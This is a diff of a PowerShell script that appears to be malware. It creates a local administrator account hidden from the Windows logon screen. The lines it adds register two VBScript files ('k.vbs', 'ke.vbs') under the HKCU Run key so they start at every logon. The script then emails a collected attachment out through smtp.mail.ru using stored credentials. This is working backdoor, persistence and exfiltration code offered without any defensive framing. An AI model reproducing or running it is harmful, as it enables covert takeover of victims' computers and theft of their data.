@@ -29,8 +29,12 @@ Add-Content -Path .\$mail_attach -Value $temp_dir
 New-LocalUser $user -Password $p -FullName $user -Description $user
 Add-LocalGroupMember -Group "Administrators" -Member $user
 
+# For user
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user
 
+# K_dir #ADD ME TO INIT.CMD
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "k" /t REG_SZ /d "wscript.exe `"`"C:\Users\$($env:Username)\AppData\Local\Temp\$($temp_dir)\k.vbs`"`"" /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ke" /t REG_SZ /d "wscript.exe `"`"C:\Users\$($env:Username)\AppData\Local\Temp\$($temp_dir)\ke.vbs`"`"" /f
 
 # Yeah...
 Send-MailMessage -From $email -To $email -Subject "test3" -Attachment .\$mail_attach -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, $emailp)
